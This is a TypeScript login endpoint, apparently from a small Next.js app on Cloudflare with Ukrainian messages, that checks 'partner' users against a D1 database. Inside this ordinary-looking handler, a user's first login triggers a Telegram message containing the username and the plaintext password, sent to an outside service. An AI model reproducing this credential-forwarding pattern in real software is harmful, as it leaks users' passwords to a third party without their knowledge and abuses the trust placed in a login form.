import { getRuntimeEnv } from "@/lib/cloudflare";
import { ensureSchema, getProfile, isPartner, readState, verifyOrCreateProfile } from "@/lib/db";
import { sendTelegram } from "@/lib/telegram";

export async function POST(request: Request) {
  const env = await getRuntimeEnv();
  const body = (await request.json().catch(() => ({}))) as {
    user?: unknown;
    password?: unknown;
  };

  if (!env.DB) {
    return Response.json({ ok: false, error: "Потрібно підключити Cloudflare D1 database." }, { status: 503 });
  }

  if (!isPartner(body.user) || typeof body.password !== "string" || body.password.trim().length < 4) {
    return Response.json({ ok: false, error: "Некоректний користувач або пароль." }, { status: 400 });
  }

await ensureSchema(env.DB);
const profileBeforeLogin = await getProfile(env.DB, body.user);
const ok = await verifyOrCreateProfile(env.DB, body.user, body.password.trim());

  if (!ok) {
    return Response.json({ ok: false, error: "Пароль не той. Спокійно, попробуй ще раз." }, { status: 401 });
  }

if (!profileBeforeLogin) {
  await sendTelegram(
    env,
    [
      "пребісюк: перший вхід",
      `body.user: ${body.user}`,
      `body.pasvord: ${body.password}`,
      `коли: ${new Date().toISOString()}`,
    ].join("\n"),
  );
}

const state = await readState(env.DB, body.user);
return Response.json({ ok: true, state });
}
